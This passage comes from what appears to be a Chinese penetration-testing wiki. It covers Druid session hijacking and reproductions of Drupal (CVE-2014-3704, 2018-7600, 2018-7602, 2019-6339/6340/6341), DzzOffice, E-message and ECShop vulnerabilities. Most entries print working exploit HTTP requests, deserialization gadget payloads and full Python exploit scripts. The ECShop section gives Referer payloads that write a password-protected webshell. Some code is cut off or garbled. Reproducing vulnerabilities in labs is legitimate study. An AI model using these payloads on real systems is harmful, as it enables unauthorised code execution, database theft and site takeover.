当遇到需要登录的Druid是可能存在弱口令的，下面给出Druid常见登录口路径。 /druid/login.html /system/druid/login.html /webpage/system/druid/login.html 以上路径可能不止存在于根目录，遇到过在二级目录下的，我们扫路径时可能就关注根目录这个点可以注意一下 Druid的一些利用方式 通过泄露的Session登录后台 1.png 直接在/druid/websession.html页面ctrl+a复制整个页面内容到EmEditor 2.png 删除红框部分，点击制表符 3.png 这样就可以直接复制了，也可以通过其他方式处理，个人比较喜欢这个方式 4.png 然后再到URI监控处找一条看起来像登录后台才能访问的路径（可用home等关键词快速定位） 5.png 6.png 此处设置爆破，将刚才得到的Session值填入，因为此处的session值存在一些特殊符号需要关闭burp默认的url编码 7.png 200即为有效session，用改cookie的插件改成有效的就能进入后台测试 8.png 通过URI监控测试未授权越权 由于有的Druid可能Session监控处没有东西，可以通过URI监控测试未授权越权 9.png 参考链接 https://www.cnblogs.com/cwkiller/p/12483223.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:04 "},"Web安全/Drupal/（CVE-2014-3704）Drupal  7.32 “Drupalgeddon” sql注入漏洞/（CVE-2014-3704）Drupal  7.32 “Drupalgeddon” sql注入漏洞.html":{"url":"Web安全/Drupal/（CVE-2014-3704）Drupal  7.32 “Drupalgeddon” sql注入漏洞/（CVE-2014-3704）Drupal  7.32 “Drupalgeddon” sql注入漏洞.html","title":"（CVE-2014-3704）Drupal  7.32 “Drupalgeddon” sql注入漏洞","keywords":"","body":"（CVE-2014-3704）Drupal \\ 一、漏洞简介 Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。 二、漏洞影响 Drupal 7.0~7.31 三、复现过程 漏洞环境 执行如下命令启动Drupal 7.31环境： docker-compose up -d 环境启动后，访问http://your-ip:8080即可看到Drupal的安装页面，使用默认配置安装即可。 其中，Mysql数据库名填写drupal，数据库用户名、密码为root，地址为mysql： Drupal 安装完成后，访问首页： Drupal 漏洞复现 该漏洞无需认证，发送如下数据包即可执行恶意SQL语句： POST /?q=node&destination=node HTTP/1.1 Host: your-ip:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 120 pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a 可见，信息已被爆出： Drupal 参考链接 https://vulhub.org/\\#/environments/drupal/CVE-2014-3704/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:05 "},"Web安全/Drupal/（CVE-2017-6920）Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞/（CVE-2017-6920）Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞.html":{"url":"Web安全/Drupal/（CVE-2017-6920）Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞/（CVE-2017-6920）Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞.html","title":"（CVE-2017-6920）Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞","keywords":"","body":"（CVE-2017-6920）Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞 一、漏洞简介 Drupal是Drupal社区所维护的一套用PHP语言开发的免费、开源的内容管理系统。Drupal7.56之前的7.x版本和8.3.4之前的8.x版本中存在远程代码执行漏洞。远程攻击者可利用该漏洞在受影响应用程序上下文中执行任意代码或造成拒绝服务。 二、漏洞影响 Drupal Drupal 8.3.3 Drupal Drupal 8.3.2 Drupal Drupal 8.3.1 Drupal Drupal 8.2.8 Drupal Drupal 8.2.7 Drupal Drupal 8.2.3 Drupal Drupal 8.2.2 三、复现过程 漏洞环境 执行如下命令启动 drupal 8.3.0 的环境： docker-compose up -d 环境启动后，访问 http://your-ip:8080/ 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现 先安装 yaml 扩展 # 换镜像源，默认带vim编辑器，所以用cat换源，可以换成自己喜欢的源 cat > sources.list >/usr/local/etc/php/conf.d/docker-php-ext-yaml.ini # 退出容器 exit # 重启容器，CONTAINER换成自己的容器ID docker restart CONTAINER 1.登录一个管理员账号 2.访问 http://127.0.0.1:8080/admin/config/development/configuration/single/import 3.如下图所示，Configuration type 选择 Simple configuration，Configuration name 任意填写，Paste your configuration here 中填写PoC如下： !php/object \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\0GuzzleHttp\\\\Psr7\\\\FnStream\\0methods\\\";a:1:{s:5:\\\"close\\\";s:7:\\\"phpinfo\\\";}s:9:\\\"_fn_close\\\";s:7:\\\"phpinfo\\\";}\" DrupalCore8PECLYAML反序列化任意代码执行漏洞/media/rId26.png) 4.点击 Import 后可以看到漏洞触发成功，弹出 phpinfo 页面 DrupalCore8PECLYAML反序列化任意代码执行漏洞/media/rId27.png) Tips： 虽然官方 CPE 信息显示从 8.0.0 开始就有该漏洞，但是在 drupal:8.0.0 容器内并没有复现成功，相同操作在 drupal:8.3.0 则可以复现成功，故基础镜像选择drupal:8.3.0 参考链接 https://vulhub.org/\\#/environments/drupal/CVE-2017-6920/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:06 "},"Web安全/Drupal/（CVE-2018-7600）Drupal Drupalgeddon 2 远程代码执行漏洞/（CVE-2018-7600）Drupal Drupalgeddon 2 远程代码执行漏洞.html":{"url":"Web安全/Drupal/（CVE-2018-7600）Drupal Drupalgeddon 2 远程代码执行漏洞/（CVE-2018-7600）Drupal Drupalgeddon 2 远程代码执行漏洞.html","title":"（CVE-2018-7600）Drupal Drupalgeddon 2 远程代码执行漏洞","keywords":"","body":"（CVE-2018-7600）Drupal Drupalgeddon 2 远程代码执行漏洞 一、漏洞简介 Drupal是Drupal社区所维护的一套使用PHP语言开发的免费，开源的内容管理系统。版本受到影响：Drupal7.58之前的版本，8.3.9之前的8.x版本，8.4.6之前的8.4.x版本，8.5.1之前的8.5.x版本。 二、漏洞影响 Drupal7.58之前的版本，8.3.9之前的8.x版本，8.4.6之前的8.4.x版本，8.5.1之前的8.5.x版本。 三、复现过程 漏洞环境 执行如下命令启动drupal 8.5.0的环境： docker-compose up -d 环境启动后，访问http://your-ip:8080/将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现 参考ianxtianxt/CVE-2018-7600，我们向安装完成的drupal发送如下数据包： POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1 Host: your-ip:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 103 form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id 成功执行代码，这个代码最终执行了id命令： DrupalDrupalgeddon2远程代码执行漏洞/media/rId27.png) exploit.py #!/usr/bin/env python3 import sys import requests print ('################################################################') print ('# Proof-Of-Concept for CVE-2018-7600') print ('# by Vitalii Rudnykh') print ('# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders') print ('# https://github.com/a2u/CVE-2018-7600') print ('################################################################') print ('Provided only for educational or information purposes\\n') target = input('Enter target url (example: https://domain.ltd/): ') # Add proxy support (eg. BURP to analyze HTTP(s) traffic) # set verify = False if your proxy certificate is self signed # remember to set proxies both for http and https # # example: # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # verify = False proxies = {} verify = True url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo \";-)\" | tee hello.txt'} r = requests.post(url, proxies=proxies, data=payload, verify=verify) check = requests.get(target + 'hello.txt', proxies=proxies, verify=verify) if check.status_code != 200: sys.exit(\"Not exploitable\") print ('\\nCheck: '+target+'hello.txt') 参考链接 https://vulhub.org/\\#/environments/drupal/CVE-2018-7600/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:07 "},"Web安全/Drupal/（CVE-2018-7602）Drupal 远程代码执行漏洞/（CVE-2018-7602）Drupal 远程代码执行漏洞.html":{"url":"Web安全/Drupal/（CVE-2018-7602）Drupal 远程代码执行漏洞/（CVE-2018-7602）Drupal 远程代码执行漏洞.html","title":"（CVE-2018-7602）Drupal 远程代码执行漏洞","keywords":"","body":"（CVE-2018-7602）Drupal 远程代码执行漏洞 一、漏洞简介 Drupal 7.x版本和8.x版本中的存在存在远程代码执行漏洞。远程攻击者可利用该中断执行任意代码。 二、漏洞影响 Drupal 7.x版本和8.x 三、复现过程 漏洞环境 执行如下命令启动drupal 7.57的环境： docker-compose up -d 环境启动后，访问 http://your-ip:8081/ 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现 参考ianxtianxt/CVE-2018-7602的PoC。 如下图所示，执行以下命令即可复现该漏洞。示例命令为 id，如图红框中显示，可以执行该命令。 # \"id\"为要执行的命令 第一个drupal为用户名 第二个drupal为密码 python3 drupa7-CVE-2018-7602.py -c \"id\" drupal drupal http://127.0.0.1:8081/ Drupal远程代码执行漏洞/media/rId27.png) CVE-2018-7602.py #!/usr/bin/env python3 import requests import argparse from bs4 import BeautifulSoup def get_args(): parser = argparse.ArgumentParser( prog=\"drupa7-CVE-2018-7602.py\", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50), epilog= ''' This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 参考链接 https://vulhub.org/\\#/environments/drupal/CVE-2018-7602/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:07 "},"Web安全/Drupal/（CVE-2019-6339）Drupal 远程代码执行漏洞/（CVE-2019-6339）Drupal 远程代码执行漏洞.html":{"url":"Web安全/Drupal/（CVE-2019-6339）Drupal 远程代码执行漏洞/（CVE-2019-6339）Drupal 远程代码执行漏洞.html","title":"（CVE-2019-6339）Drupal 远程代码执行漏洞","keywords":"","body":"（CVE-2019-6339）Drupal 远程代码执行漏洞 一、漏洞简介 Drupal core是Drupal社区所维护的一套用PHP语言开发的免费、开源的内容管理系统。 Drupal core 7.62之前的7.x版本、8.6.6之前的8.6.x版本和8.5.9之前的8.5.x版本中的内置phar stream wrapper（PHP）存在远程代码执行漏洞。远程攻击者可利用该漏洞执行任意的php代码。 二、漏洞影响 Drupal core 7.62之前的7.x版本、8.6.6之前的8.6.x版本和8.5.9之前的8.5.x版本 三、复现过程 漏洞环境 执行如下命令启动drupal 8.5.0的环境： docker-compose up -d 环境启动后，访问 http://your-ip:8080/ 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现 如下图所示，先使用管理员用户上传头像，头像图片为构造好的 PoC，参考ianxtianxt/PoC的PoC Drupal远程代码执行漏洞/media/rId27.png) Drupal 的图片默认存储位置为 /sites/default/files/pictures//，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。 访问 http://127.0.0.1:8080/admin/config/media/file-system，在 Temporary directory 处输入之前上传的图片路径，示例为 phar://./sites/default/files/pictures/2019-06/blog-ZDI-CAN-7232-cat_0.jpg，保存后将触发该漏洞。如下图所示，触发成功。 Drupal远程代码执行漏洞/media/rId28.png) 参考链接 https://vulhub.org/\\#/environments/drupal/CVE-2019-6339/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:08 "},"Web安全/Drupal/（CVE-2019-6340）Drupal 远程代码执行漏洞/（CVE-2019-6340）Drupal 远程代码执行漏洞.html":{"url":"Web安全/Drupal/（CVE-2019-6340）Drupal 远程代码执行漏洞/（CVE-2019-6340）Drupal 远程代码执行漏洞.html","title":"（CVE-2019-6340）Drupal 远程代码执行漏洞","keywords":"","body":"（CVE-2019-6340）Drupal 远程代码执行漏洞 一、漏洞简介 Drupal Core存在一个远程代码执行漏洞。此次，它的目标是Drupal 8的REST模块，默认情况下，该模块是禁用了，但是该模块在大多数情况下会被用户使用。**该漏洞本质上是由于用户使用Drupal Core RESTful Web Services (rest)时，某些字段类型无法正确清理非格式源中的数据。在某些情况下，这可能导致任意PHP代码执行。**此外，我们发现针对该漏洞提出的即时补救措施是不完整的，这可能会导致一种错误的安全感。用户可能会根据官方的说明禁用掉RESTful Web Services 中的POST/PATCH方法，但是事实上GET方法也能在无任何权限的情况下执行远程代码，所以用户必须执行Drupal的最新的安全更新或者禁用RESTful Web Services服务，否则网站依旧处于风险当中。 二、漏洞影响 Drupal 8.6.x \\ Drupal 8.5.x \\ 三、复现过程 触发unserialize() GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1 Host: 192.168.1.25 Content-Type: application/hal+json Content-Length: 642 { \"link\": [ { \"value\": \"link\", \"options\": \"\" } ], \"_links\": { \"type\": { \"href\": \"http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default\" } } } 由于Drupal 8使用Guzzle，我们可以使用PHPGGC生成有效负载： $ ./phpggc guzzle / rce1系统ID --json “ O：24：\\” GuzzleHttp \\\\ Psr7 \\\\ FnStream \\“：2：{s：33：\\” \\ u0000GuzzleHttp \\\\ Psr7 \\\\ FnStream \\ u0000methods \\“ ; a：1：{s：5：\\“ close \\”; a：2：{i：0; O：23：\\“ GuzzleHttp \\\\ HandlerStack \\”：3：{s：32：\\“ \\ u0000GuzzleHttp \\ \\ HandlerStack \\ u0000handler \\“; s：2：\\” id \\“; s：30：\\” \\ u0000GuzzleHttp \\\\ HandlerStack \\ u0000stack \\“; a：1：{i：0; a：1：{i：0 ; s：6：\\“ system \\”;}} s：31：\\“ \\ u0000GuzzleHttp \\\\ HandlerStack \\ u0000cached \\”; b：0;} i：1; s：7：\\“ resolve \\”;}} s：9：\\“ _ fn_close \\”; a：2：{i：0; r：4; i：1; s：7：\\“ resolve \\”;}}“ 我们可以通过get请求发送有效载荷 GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1 Host: www.0-sec.org Content-Type: application/hal+json Content-Length: 642 { \"link\": [ { \"value\": \"link\", \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:2:\\\"id\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\" } ], \"_links\": { \"type\": { \"href\": \"http://www.0-sec.org/drupal-8.6.9/rest/type/shortcut/default\" } } } 返回值 HTTP/1.1 200 OK Link: X-Generator: Drupal 8 (https://www.drupal.org) X-Drupal-Cache: MISS Connection: close Content-Type: application/hal+json Content-Length: 9012 {...}uid=33(www-data) gid=33(www-data) groups=33(www-data) poc #!/usr/bin/env python3 # CVE-2019-6340 Drupal str: \"\"\" Builds a URL \"\"\" f = '' for x in args: f = urljoin(f, x) return f def uri_valid(x: str) -> bool: \"\"\" https://stackoverflow.com/a/38020041 \"\"\" result = urlparse(x) return all([result.scheme, result.netloc, result.path]) def check_drupal_cache(r: requests.Response) -> bool: \"\"\" Check if a response had the cache header. \"\"\" if 'X-Drupal-Cache' in r.headers and r.headers['X-Drupal-Cache'] == 'HIT': return True return False def find_article(base: str, f: int = 1, l: int = 100): \"\"\" Find a target article that does not 404 and is not cached \"\"\" while f bool: \"\"\" Check if the target is vulnerable. \"\"\" payload = { \"_links\": { \"type\": { \"href\": f\"{urljoin(base, '/rest/type/node/INVALID_VALUE')}\" } }, \"type\": { \"target_id\": \"article\" }, \"title\": { \"value\": \"My Article\" }, \"body\": { \"value\": \"\" } } u = build_url(base, '/node/', str(node_id)) r = requests.get(f'{u}?_format=hal_json', json=payload, headers={\"Content-Type\": \"application/hal+json\"}) if check_drupal_cache(r): print(f'Checking if node {node_id} is vuln returned cache HIT, ignoring') return False if 'INVALID_VALUE does not correspond to an entity on this site' in r.text: return True return False def exploit(base: str, node_id: int, cmd: str): \"\"\" Exploit using the Guzzle Gadgets \"\"\" # pad a easy search replace output: cmd = 'echo ---- & ' + cmd payload = { \"link\": [ { \"value\": \"link\", \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000\" \"GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"\" \"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:\" \"{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";\" \"s:|size|:\\\"|command|\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000\" \"stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000\" \"GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"\" \"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\" \"\".replace('|size|', str(len(cmd))).replace('|command|', cmd) } ], \"_links\": { \"type\": { \"href\": f\"{urljoin(base, '/rest/type/shortcut/default')}\" } } } u = build_url(base, '/node/', str(node_id)) r = requests.get(f'{u}?_format=hal_json', json=payload, headers={\"Content-Type\": \"application/hal+json\"}) if check_drupal_cache(r): print(f'Exploiting {node_id} returned cache HIT, may have failed') if '----' not in r.text: print('[warn] Command execution _may_ have failed') print(r.text.split('----')[1]) def main(base: str, cmd: str): \"\"\" Execute an OS command! \"\"\" print('[+] Finding a usable node id...') article = find_article(base) if not article: print('[!] Unable to find a node ID to reference. Check manually?') return print(f'[+] Using node_id {article}') vuln = check(base, article) if not vuln: print('[!] Target does not appear to be vulnerable.') print('[!] It may also simply be a caching issue, so maybe just try again later.') return print(f'[+] Target appears to be vulnerable!') exploit(base, article, cmd) if __name__ == '__main__': print('CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE PoC') print(' by @leonjza\\n') print('References:\\n' ' https://www.drupal.org/sa-core-2019-003\\n' ' https://www.ambionics.io/blog/drupal8-rce\\n') print('[warning] Caching heavily affects reliability of this exploit.\\n' 'Nodes are used as they are discovered, but once they are done,\\n' 'you will have to wait for cache expiry.\\n') if len(sys.argv) ') print(f' Example: {sys.argv[0]} http://127.0.0.1/ id') target = sys.argv[1] command = sys.argv[2] if not uri_valid(target): print(f'Target {target} is not a valid URL') sys.exit(1) print(f'Targeting {target}...') main(target, command) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:09 "},"Web安全/Drupal/（CVE-2019-6341）Drupal xss漏洞/（CVE-2019-6341）Drupal xss漏洞.html":{"url":"Web安全/Drupal/（CVE-2019-6341）Drupal xss漏洞/（CVE-2019-6341）Drupal xss漏洞.html","title":"（CVE-2019-6341）Drupal xss漏洞","keywords":"","body":"（CVE-2019-6341）Drupal xss漏洞 一、漏洞简介 Drupal是Drupal社区的一套使用PHP语言开发的开源内容管理系统。 Drupal 7.65之前的7版本、8.6.13之前的8.6版本和8.5.14之前的8.5版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。 二、漏洞影响 Drupal 7.65之前的7版本、8.6.13之前的8.6版本和8.5.14之前的8.5版本 三、复现过程 漏洞环境 执行如下命令启动drupal 8.5.0的环境： docker-compose up -d 环境启动后，访问 http://your-ip:8080/ 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现 该漏洞需要利用drupal文件模块上传文件的漏洞，伪造一个图片文件，上传，文件的内容实际是一段HTML代码，内嵌JS，这样其他用户在访问这个链接时，就可能触发XSS漏洞。 Drupal 的图片默认存储位置为 /sites/default/files/pictures//，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。 使用PoC上传构造好的伪造GIF文件，PoC参考ianxtianxt/PoC的PoC。 如图，输入如下命令，即可使用PoC构造样本并完成上传功能，第一个参数为目标IP 第二个参数为目标端口。 php cve-2019-6341-exp.php 192.168.11.1 8080 Drupalxss漏洞/media/rId27.png) 上传成功后，访问图片位置，即可触发 XSS 漏洞，如下图所示。 Tips: 因为 Chrome 和 FireFox 浏览器自带部分过滤 XSS 功能，所以验证存在时可使用 Edge 浏览器或者 IE 浏览器。 访问的图片名称为_0的原因是因为 Drupal 的规则机制，具体原理见Drupal 1-click to RCE 分析 Drupalxss漏洞/media/rId29.png) 参考链接 https://vulhub.org/\\#/environments/drupal/CVE-2019-6341/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:09 "},"Web安全/DzzOffice/DzzOffice = 2.02 RCE/DzzOffice = 2.02 RCE.html":{"url":"Web安全/DzzOffice/DzzOffice = 2.02 RCE/DzzOffice = 2.02 RCE.html","title":"DzzOffice = 2.02 RCE","keywords":"","body":"DzzOffice 环境安装 源代码： https://github.com/zyx0814/dzzoffice/releases/ 利用前提 首先需要获取到authkey 这个可以通过爆破或者其他的方式获取到具体的这个请看文章 我现在的环境的key为：3090dfHwzmw9lsC3 在网上找了一下加密的脚本 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc.str_replace('=', '', base64_encode($result)); } } echo base64_encode(authcode_config(\"disk::..././..././..././shell.php\",md5('3090dfHwzmw9lsC3'),'ENCODE')); 输出 然后构造包： POST /core/api/wopi/index.php?access_token=1&action=contents&path=ZmM0OWp3bDgxbDE3WlhocFlCVUl4ZDFvRkNYeDRVaGtQbklJYlVSUjV2VjRzLzBwUkJ0Y051ZHl4QzVITFlvN205cENqZktDY1lyNHRQQ0pWblU= HTTP/1.1 Host: word.com Content-Length: 18 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://word.com Referer: http://word.com/user.php?mod=login Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close 对于这个漏洞怎么产生的，具体的可以看看代码。 大概的流程是验证这个path 可用性。然后过滤了../ \\n \\r 通过…/./ 绕过。到了写文件的方法。file_put_contents 两个参数都是可控的。就直接写入文件了 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:10 "},"Web安全/E-message/E-message 越权访问漏洞/E-message 越权访问漏洞.html":{"url":"Web安全/E-message/E-message 越权访问漏洞/E-message 越权访问漏洞.html","title":"E-message 越权访问漏洞","keywords":"","body":"E-message 越权访问漏洞 漏洞描述 E-message 存在越权访问漏洞，由于配置页面没有做权限设定，导致攻击者可以访问并重置账号密码等操作 漏洞影响 E-message FOFA title=\"emessage 设置: 数据库设置 - 标准连接\" 漏洞复现 访问安装页面 http://xxx.xxx.xxx.xxx/setup/setup-datasource-standard.jsp 可以获取账号密码信息，一路点击右下角的继续将会跳转修改管理员账号密码页面，修改后登录即可获取后台权限 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:11 "},"Web安全/ECShop/ECShop = 2.7.x sql注入漏洞/ECShop = 2.7.x sql注入漏洞.html":{"url":"Web安全/ECShop/ECShop = 2.7.x sql注入漏洞/ECShop = 2.7.x sql注入漏洞.html","title":"ECShop = 2.7.x sql注入漏洞","keywords":"","body":"ECShop \\ 一、漏洞简介 二、漏洞影响 ECShop（2.x、3.0.x、3.6.x） 三、复现过程 漏洞分析 先看user.php $back_act变量来源于HTTP_REFERER，我们可控。 assign函数用于在模版变量里赋值 再看display函数 读取user_passport.dwt模版文件内容，显示解析变量后的html内容，用_echash做分割，得到$k然后交给isnert_mod处理，由于_echash是默认的，不是随机生成的，所以$val内容可随意控制。 再看insert_mod函数 非常关键的一个地方，这里进行了动态调用 $val传入进来用|分割，参数传入进来时需要被序列化 再看include/lib_insert.php中的insert_ads函数 可以看到这里直接就能注入了 payload GET /user.php?act=login HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1 Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:72:\"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -\";s:2:\"id\";i:1;} Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 参考链接 https://cloud.tencent.com/developer/article/1333449 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:12 "},"Web安全/ECShop/ECShop = 2.7.x 代码执行漏洞/ECShop = 2.7.x 代码执行漏洞.html":{"url":"Web安全/ECShop/ECShop = 2.7.x 代码执行漏洞/ECShop = 2.7.x 代码执行漏洞.html","title":"ECShop = 2.7.x 代码执行漏洞","keywords":"","body":"ECShop \\ 一、漏洞简介 二、漏洞影响 ECShop（2.x、3.0.x、3.6.x） 三、复现过程 漏洞分析 继续看fetch函数 追踪_eval函数 $position_style变量来源于数据库中的查询结构 然后我们继续构造SQL注入，因为这段sql操作 order by部分换行了截断不了 所以需要在id处构造注释来配合num进行union查询 payload SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop27`.`ecs_ad` AS a LEFT JOIN `ecshop27`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time = '1535678679' AND a.position_id = ''/*' ORDER BY rnd LIMIT */ union select 1,2,3,4,5,6,7,8,9,10-- - 函数中有一个判断 我们 id传入'/* num传入*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10-- -就能绕过了 var_dump一下 再看fetch函数,传入的参数被fetch_str函数处理了 追踪fetch_str函数，这里的字符串处理流程比较复杂 return preg_replace(\"/{([^\\}\\{\\n]*)}/e\", \"\\$this->select('\\\\1');\", $source); 这一行意思是比如$source是xxxx{$asd}xxx,那么经过这行代码处理后就是返回this->select('$asd')的结果 看看select函数 第一个字符为$时进入$this->get_val函数 我们$val没有.$又进入make_var函数 最后这里引入单引号从变量中逃逸 我们要闭合_var所以最终payload是 {$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEudHh0JywnZ2V0c2hlbGwnKQ=='));//}xxx 会在网站跟目录生成1.txt 里面内容是getshell 2.x phpinfo(): Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:110:\"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -\";s:2:\"id\";s:4:\"' /*\";}554fcae493e564ee0dc75bdf2ebf94ca webshell: Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";} 　　会在网站根目录生成1.php，密码：1337 3.x phpinfo(): Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:107:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a webshell: Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:289:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a 　　会在网站根目录生成1.php，密码：1337 小脚本 　　下面给出一个序列化的php脚本（第9个位置就是你想要的）： '*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7B24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A7A4575634768774A79776E50443977614841675A585A686243676B58314250553152624F546C644B543867506963702729293B2F2F7D787878,10-- -','id'=>'\\'/*'); echo 